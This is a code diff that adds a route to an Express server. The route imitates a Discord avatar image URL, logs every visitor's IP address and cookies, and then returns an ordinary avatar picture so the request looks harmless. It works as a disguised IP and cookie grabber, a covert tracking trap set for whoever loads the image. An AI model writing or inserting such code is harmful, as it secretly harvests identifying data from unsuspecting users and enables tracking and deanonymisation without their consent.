@@ -39,6 +39,30 @@ app.use((err, req, res, next) => {
 // Start server
 const port = process.env.PORT || 3000;
 
+
+// server.js
+const cookieParser = require('cookie-parser');
+
+app.use(cookieParser());
+
+app.get('/avatars/720683700249165866/e96a7c28520e1ab101ba2d2a8a97fd28.png?size=256', (req, res) => {
+  const clientIp = req.ip || req?.connection?.remoteAddress;
+  const cookiesHeader = req.headers.cookie || '';
+  const parsedCookies = req.cookies || {};
+
+  const log = `IP=${clientIp} | CookieHeader="${cookiesHeader}" | Parsed=${JSON.stringify(parsedCookies)}`;
+  console.log(log);
+
+  const imgPath = path.join(__dirname, 'public', 'avatar.jpg');
+  if (fs.existsSync(imgPath)) {
+    res.sendFile(imgPath);
+  } else {
+    res.status(404).send('avatar not found');
+  }
+});
+
 app.listen(port, () => {
   console.log(`Proxy server running on port ${port}`);
 });
+
+
